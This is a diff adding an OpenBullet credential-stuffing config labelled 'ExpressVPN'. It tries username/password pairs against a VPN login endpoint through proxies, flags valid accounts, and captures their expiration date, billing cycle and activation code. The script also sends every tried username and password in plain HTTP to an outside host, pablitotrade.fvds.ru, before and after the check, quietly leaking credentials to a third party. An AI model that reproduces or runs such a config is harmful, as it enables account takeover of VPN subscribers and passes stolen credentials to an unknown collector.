@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-8a85c49d1c0cb18f7702cd7c438c945e-LoliKEY",
+  "Name": "ExpressVPN",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-13T23:36:58.7773291+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Masterz (loliX Encrypted)",
+  "Version": "1.2.2.8 [OB REBOOT",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "http://pablitotrade.fvds.ru/proxys.php?user=<USER>&pass=<PASS>&type=expressvpn" 
+  
+
+REQUEST GET "https://www.jfciocb.net/vpn_servers?email=<USER>&password=<PASS>" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authentication failed" 
+    KEY "Payment Verification Needed" 
+  KEYCHAIN Success OR 
+    KEY "<subscription>" 
+
+PARSE "<SOURCE>" LR "{\"name\":\"exp\",\"value\":\"<expiration_date>" "<" -> CAP "expiration:" 
+
+PARSE "<SOURCE>" LR "\"name\":\"autoRenew\",\"value\":\"<billing_cycle>" "<" -> CAP "autoRenewal:" 
+
+PARSE "<SOURCE>" LR "\"name\":\"code\",\"value\":\"<long_activation_code>" "<" -> CAP "activationCode:" 
+
+REQUEST GET "http://pablitotrade.fvds.ru/proxies.php?user=<USER>&pass=<PASS>&type=expressvpn" 
+  
+
+
